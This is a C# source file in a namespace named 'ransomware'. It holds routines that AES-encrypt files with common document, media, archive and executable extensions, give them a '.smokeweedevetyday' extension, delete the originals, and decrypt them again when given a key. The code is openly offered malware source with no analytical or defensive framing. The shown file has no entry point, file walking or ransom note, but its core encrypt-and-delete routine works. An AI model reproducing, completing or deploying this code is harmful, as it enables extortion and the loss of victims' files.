using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Security.Cryptography;
using System.Runtime.InteropServices;

namespace ransomware
{
     
    public static class MD5Extensions
    {
        public static byte[] tomd5(this string str)
        {
            using (var cryptoMD5 = System.Security.Cryptography.MD5.Create())
            {
                var bytes = Encoding.UTF8.GetBytes(str);
                var hash = cryptoMD5.ComputeHash(bytes);
               /* var md5 = BitConverter.ToString(hash)
                  .Replace("-", String.Empty)
                  .ToUpper();*/

                return hash;
            }
        }
    }
    class module
    {
        [DllImport("User32.dll", CharSet = CharSet.Unicode)]
        public static extern int MessageBox(IntPtr h, string m, string c, int type);
        public static bool encrypt_check(string file, byte[] key)
        {

            try
            {

                var key_s=BitConverter.ToString(key);
                var key_md5 = key_s.tomd5();
                //Console.Out.WriteLine(BitConverter.ToString(key_md5));
                //Console.Out.WriteLine(key_md5.Length);


                var extension_list = ".txt .pdf .cer .avi .mp3 .mp4 .mov" +
                                     ".html .py .doc .docx .ppt .pptx .jpg .jpeg" +
                                     ".png .rar .zip .xlxs .exe";
                string fileDir = new FileInfo(file).DirectoryName + @"\";
                string fileFullName = new FileInfo(file).Name;
               // Console.Out.WriteLine(fileDir);
                //Console.Out.WriteLine(fileFullName);
                string extName = new FileInfo(file).Extension.ToLower();

                if (extName == ".smokeweedevetyday") { Console.Out.WriteLine("already"); return true; }

                if (!extension_list.Contains(extName) || extName == "")
                { return false; }

                Byte[] fileData = File.ReadAllBytes(file);
                fileData=AES.encrypt(fileData, key);
                Array.Resize(ref fileData, fileData.Length + 16);
                Array.ConstrainedCopy(key_md5, 0, fileData, fileData.Length - 16, key_md5.Length);
                File.WriteAllBytes(fileDir + fileFullName + ".smokeweedevetyday", fileData);
                File.Delete(file);

                return true;
            }
            catch (Exception) { };

            return false;
        }
        public static bool decrypt_check(string file, byte[] key, ref bool flag)
        {
            try
            {
                var key_s=BitConverter.ToString(key);
                var key_md5 = key_s.tomd5();

                string fileDir = new FileInfo(file).DirectoryName + @"\";
                string symbol = new FileInfo(file).Name.Split('.')[2];
                string extName = new FileInfo(file).Name.Split('.')[1];
                string fileName = new FileInfo(file).Name.Split('.')[0];
                //Console.Out.WriteLine(symbol);
                //Console.Out.WriteLine(extName);
                //.Out.WriteLine(fileName);



                if (symbol != "smokeweedevetyday") return false;

                Byte[] fileData = File.ReadAllBytes(file);
                Byte[] hash = new byte[16];
                Array.ConstrainedCopy(fileData, fileData.Length - 16, hash, 0, 16);
                Array.Resize(ref fileData, fileData.Length - 16);
                fileData = AES.decrypt(fileData, key);

                //Console.Out.WriteLine(BitConverter.ToString(key_md5));
                //Console.Out.WriteLine(BitConverter.ToString(hash));
                for (int i = 0; i < 16;i++ )
                {
                    if (hash[i] != key_md5[i]) 
                    {
                        //Console.Out.WriteLine(Convert.ToString(i));
                        //Console.Out.WriteLine("ERROR");
                        flag = true;
                        //return false;
                    }
                }
                if (flag==true) {
                    MessageBox((IntPtr)0, "Key invalid", "", 0);

                    return false; }

                File.WriteAllBytes(fileDir + fileName+'.'+extName, fileData);
                //Console.Out.WriteLine(fileDir + fileName + '.' + extName);
                //Console.Out.WriteLine(file);

                File.Delete(file);
                return true;

            }
            catch (Exception)
            {
            }
            return false;
        }
    }

    public class AES
    {
        public static Byte[] gen_key()
        {
            RijndaelManaged aes_obj = new RijndaelManaged();
            aes_obj.KeySize = 128;
            aes_obj.GenerateKey();
            return aes_obj.Key;
        }
        public static Byte[] encrypt(Byte[] data, Byte[] key)
        {
            RijndaelManaged aes_obj = new RijndaelManaged();
            aes_obj.KeySize = 128;
            //aes_obj.GenerateIV();
            ICryptoTransform aes_Encryptor = aes_obj.CreateEncryptor(key, key);
            byte[] output = aes_Encryptor.TransformFinalBlock(data, 0, data.Length);
            return output;
        }

        public static Byte[] decrypt(byte[] data, Byte[] key)
        {
            RijndaelManaged aes_obj = new RijndaelManaged();
            aes_obj.KeySize = 128;
            ICryptoTransform aes_Decryptor = aes_obj.CreateDecryptor(key, key);
            byte[] output = aes_Decryptor.TransformFinalBlock(data, 0, data.Length);
            return output;
        }
    }
}
